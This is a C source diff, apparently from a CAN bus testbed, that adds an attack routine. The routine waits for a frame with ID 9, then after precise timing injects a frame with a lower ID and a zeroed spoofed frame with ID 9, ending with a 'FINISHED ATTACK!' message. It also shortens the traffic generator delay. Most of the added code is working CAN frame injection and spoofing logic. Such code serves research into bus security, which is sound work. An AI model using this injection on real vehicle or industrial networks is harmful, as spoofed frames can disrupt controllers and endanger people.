@@ -7,6 +7,7 @@
 
 #define MAX_LONG_NAME 255
 #define ID_TEST 9
+char interface[MAX_LONG_NAME];
 
 void run_generators() {
   srand(time(NULL) ^ getpid() ^ (getppid() << 16));
@@ -31,7 +32,7 @@ void continuous_test_send() {
   struct timespec next;
   clock_gettime(CLOCK_MONOTONIC, &next);    
   srand(time(NULL) ^ getpid() ^ (getpid() << 16));
-  int delay_ms = 100;
+  int delay_ms = 24;
   while(1){
     next.tv_nsec += delay_ms * 1000 * 1000;
     if (next.tv_nsec >= 1000000000) {
@@ -52,6 +53,10 @@ void continuous_test_send() {
 }
 
 void attack() {
+  if (initialize_can_interface(interface, 0)) {
+    fprintf(stderr, "Error initializing interface!\n");
+    return;
+  }
   if (setup_filter_attack(ID_TEST)) {
     fprintf(stderr, "Error applying filter!\n");
     return;
@@ -60,11 +65,35 @@ void attack() {
   while (frame.can_id != ID_TEST) {
     read_can_frame(&frame);
   }
-  printf("LETTO!\n");
+  struct timespec next;
+  next.tv_nsec += 24 * 1000 * 1000;
+  if (next.tv_nsec >= 1000000000) {
+      next.tv_sec += 1;
+      next.tv_nsec -= 1000000000;
+  }
+  clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &next, NULL);
+
+  frame.can_id = ID_TEST - 1;
+  write_can_frame(&frame);
+  frame.can_id = ID_TEST;
+  for (int j = 0; j < frame.can_dlc; j++) {
+    frame.data[j] = 0;
+  }
+
+  for (int i = 0; i < 1; i++) {
+    write_can_frame(&frame);  
+    next.tv_nsec += 2 * 1000 * 1000;
+    if (next.tv_nsec >= 1000000000) {
+        next.tv_sec += 1;
+        next.tv_nsec -= 1000000000;
+    }
+  }
+  clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &next, NULL);
+
+  printf("\nFINISHED ATTACK!\n");
 }
 
 int main(int argc, char **argv){
-  char interface[MAX_LONG_NAME];
   int num_generators = 1;
  
   if (argc > 1) {
@@ -84,7 +113,7 @@ int main(int argc, char **argv){
   pid_t test_pid;
 
 
-  if (initialize_can_interface(interface)) {
+  if (initialize_can_interface(interface, 1)) {
     perror("Error during initialization");
     return 1;
   }
@@ -105,6 +134,8 @@ int main(int argc, char **argv){
   }
   
   attack();
+
+  usleep(20000 * 1000);
   
   for(int i = 0; i<num_generators; i++) {
     kill(children[i], SIGTERM);
